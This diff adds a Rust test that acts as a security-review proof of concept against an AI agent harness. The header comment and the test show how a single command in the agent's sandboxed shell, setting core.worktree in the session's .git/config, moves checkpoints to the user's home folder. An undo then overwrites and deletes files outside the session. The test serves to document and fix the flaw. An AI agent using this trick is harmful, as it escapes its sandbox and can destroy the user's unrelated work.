+//! GATE 3 REVIEW PROOF (S-3, docs/security-review/2026-11-gate3.md).
+//!
+//! Passes today, and passing is the defect: it asserts that the attack
+//! worked. Invert the assertions when the finding is fixed.
+//!
+//! The checkpoint's folder is whatever `git rev-parse --show-toplevel` says
+//! in the session folder (`repo_info`), and the only check is that the
+//! session folder is inside it. The session's own `.git/config` is writable
+//! from the agent's sandboxed shell, and `core.worktree` there moves the
+//! top level to any ancestor. The node's own git (not sandboxed) then
+//! snapshots that ancestor every turn, names files outside the session
+//! folder in the chat's events, and an undo writes and deletes there.
+
+use super::*;
+
+fn sh(dir: &Path, args: &[&str]) {
+    let ok = std::process::Command::new("git")
+        .arg("-C")
+        .arg(dir)
+        .args(args)
+        .env("GIT_CONFIG_GLOBAL", "/dev/null")
+        .env("GIT_CONFIG_NOSYSTEM", "1")
+        .env("GIT_AUTHOR_NAME", "t")
+        .env("GIT_AUTHOR_EMAIL", "t@t")
+        .env("GIT_COMMITTER_NAME", "t")
+        .env("GIT_COMMITTER_EMAIL", "t@t")
+        .status()
+        .unwrap()
+        .success();
+    assert!(ok, "git {args:?}");
+}
+
+#[tokio::test]
+async fn review_s3_core_worktree_moves_checkpoints_and_undo_out_of_the_session_folder() {
+    let d = tempfile::tempdir().unwrap();
+    let top = d.path().canonicalize().unwrap();
+    let base = top.join("data/checkpoints");
+    let home = top.join("home");
+    let proj = home.join("proj");
+    let other = home.join("other-project");
+    std::fs::create_dir_all(&proj).unwrap();
+    std::fs::create_dir_all(&other).unwrap();
+    std::fs::write(home.join(".profile"), "export A=1\n").unwrap();
+    std::fs::write(other.join("notes.txt"), "v1\n").unwrap();
+    sh(&proj, &["init", "-q", "-b", "main"]);
+    std::fs::write(proj.join("a.txt"), "one\n").unwrap();
+    sh(&proj, &["add", "."]);
+    sh(&proj, &["commit", "-qm", "init"]);
+
+    // What the agent's shell does, inside its own folder (one command):
+    sh(
+        &proj,
+        &["config", "--local", "core.worktree", home.to_str().unwrap()],
+    );
+
+    // The next turn's checkpoint: its folder is now the user's home.
+    let repo = repo_for(&proj, Some(&base)).await.unwrap();
+    assert_eq!(
+        repo.root, home,
+        "the checkpoint root left the session folder"
+    );
+    let before = snapshot(&repo, "refs/harness/s/t/before", "before")
+        .await
+        .unwrap();
+    // Meanwhile the person works in another project and on a dotfile.
+    std::fs::write(other.join("notes.txt"), "v2: an hour of work\n").unwrap();
+    std::fs::write(other.join("new.txt"), "new\n").unwrap();
+    std::fs::write(home.join(".profile"), "export A=2\n").unwrap();
+    let after = snapshot(&repo, "refs/harness/s/t/after", "after")
+        .await
+        .unwrap();
+    // The turn's `checkpoint{after}` event lists these paths in the chat.
+    let ch: Vec<String> = changed(&repo, &before, &after)
+        .await
+        .unwrap()
+        .into_iter()
+        .map(|(_, p)| p)
+        .collect();
+    assert!(
+        ch.contains(&"other-project/notes.txt".to_string()),
+        "{ch:?}"
+    );
+    assert!(ch.contains(&".profile".to_string()), "{ch:?}");
+    // "Undo" of that turn, unforced: the node writes and deletes outside
+    // the session folder, in a folder no session was ever allowed to use.
+    restore(&repo, &before, &after, false).await.unwrap();
+    assert_eq!(
+        std::fs::read_to_string(other.join("notes.txt")).unwrap(),
+        "v1\n"
+    );
+    assert!(!other.join("new.txt").exists());
+    assert_eq!(
+        std::fs::read_to_string(home.join(".profile")).unwrap(),
+        "export A=1\n"
+    );
+}
